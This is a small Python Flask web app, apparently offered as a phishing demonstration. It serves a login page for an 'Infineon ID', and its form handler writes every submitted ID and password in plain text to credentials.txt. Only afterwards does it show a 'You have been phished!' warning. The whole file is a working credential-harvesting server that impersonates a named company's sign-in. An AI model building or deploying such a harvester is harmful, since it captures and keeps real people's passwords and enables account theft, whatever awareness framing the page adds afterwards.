from flask import Flask, request, render_template

app = Flask(__name__)

# Route for the login page
@app.route('/')
def index():
    return render_template('index.html')

# Route to handle form submission
@app.route('/login', methods=['POST'])
def login():
    infineon_id = request.form.get('infineon_id')
    password = request.form.get('password')

    # Save credentials to a file
    with open('credentials.txt', 'a') as file:
        file.write(f"Infineon ID: {infineon_id}, Password: {password}\n")

    # Display phishing warning
    return """
    <h1 style="color: red; text-align: center; margin-top: 20%;">
        You have been phished!
    </h1>
    <p style="text-align: center; font-size: 18px;">
        This is a demonstration of how phishing attacks work.
        Never share your credentials on untrusted websites.
    </p>
    """

if __name__ == '__main__':
    app.run(debug=True)
